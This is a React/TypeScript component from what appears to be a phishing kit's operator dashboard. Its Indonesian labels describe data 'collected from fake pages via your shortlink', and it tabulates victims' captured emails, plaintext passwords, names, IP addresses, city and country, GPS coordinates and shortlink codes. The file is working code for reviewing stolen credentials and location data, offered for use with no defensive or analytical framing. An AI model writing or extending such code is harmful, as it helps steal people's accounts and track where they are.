import { Mail, Shield } from 'lucide-react';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { formatDate } from '@/lib/utils';

interface FormCaptureData {
  id: string;
  source: string;
  email: string | null;
  password: string | null;
  name: string | null;
  phone: string | null;
  additional_data: any;
  ip: string | null;
  country: string | null;
  city: string | null;
  browser: string | null;
  device: string | null;
  os: string | null;
  created_at: bigint | null;
  shortcode?: string | null;
}

interface FormCaptureTableProps {
  formCaptures: FormCaptureData[];
  getSourceColor: (source: string) => string;
  getSourceIcon: (source: string) => JSX.Element;
}

export function FormCaptureTable({
  formCaptures,
  getSourceColor,
  getSourceIcon,
}: FormCaptureTableProps) {
  if (formCaptures.length === 0) {
    return (
      <Card>
        <CardHeader>
          <CardTitle>Tidak Ada Data</CardTitle>
          <CardDescription>
            Belum ada data form yang ditangkap untuk kategori ini
          </CardDescription>
        </CardHeader>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Data Form Captures</CardTitle>
        <CardDescription>
          Informasi yang berhasil dikumpulkan dari halaman palsu melalui
          shortlink Anda
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className='overflow-x-auto'>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead className='w-[100px]'>Source</TableHead>
                <TableHead>Email</TableHead>
                <TableHead>Password</TableHead>
                <TableHead>IP Address</TableHead>
                <TableHead>Lokasi</TableHead>
                <TableHead>Geolokasi</TableHead>
                <TableHead>Shortcode</TableHead>
                <TableHead className='text-right'>Tanggal</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {formCaptures.map((capture) => (
                <TableRow key={capture.id}>
                  <TableCell className='font-medium'>
                    <div
                      className={`flex items-center rounded-md p-1 ${getSourceColor(
                        capture.source,
                      )}`}
                    >
                      {getSourceIcon(capture.source)}
                      <span className='ml-1'>{capture.source}</span>
                    </div>
                  </TableCell>
                  <TableCell>
                    {capture.email ? (
                      <div className='flex items-center text-sm'>
                        <Mail className='mr-1 h-4 w-4' />
                        {capture.email}
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                    {capture.name && (
                      <div className='mt-1 text-xs text-muted-foreground'>
                        Name: {capture.name}
                      </div>
                    )}
                  </TableCell>
                  <TableCell>
                    {capture.password ? (
                      <div className='flex items-center gap-1'>
                        <Shield className='h-4 w-4 text-red-600' />
                        <span className='font-mono text-sm'>
                          {capture.password}
                        </span>
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    {capture.ip ? (
                      <div className='font-mono text-sm'>{capture.ip}</div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    <div className='text-sm'>
                      {capture.city ? (
                        <div>{capture.city}</div>
                      ) : (
                        <span className='text-muted-foreground'>N/A</span>
                      )}
                      {capture.country && (
                        <div className='text-xs text-muted-foreground'>
                          {capture.country}
                        </div>
                      )}
                    </div>
                  </TableCell>
                  <TableCell>
                    {capture.additional_data &&
                    capture.additional_data.coordinates ? (
                      <div className='font-mono text-sm'>
                        {capture.additional_data.coordinates.lat},{' '}
                        {capture.additional_data.coordinates.lng}
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    {capture.shortcode ? (
                      <span className='rounded bg-gray-100 p-1 font-mono text-xs dark:bg-gray-800'>
                        {capture.shortcode}
                      </span>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell className='text-right'>
                    {capture.created_at ? (
                      <div className='text-sm'>
                        {formatDate(Number(capture.created_at))}
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </CardContent>
    </Card>
  );
}
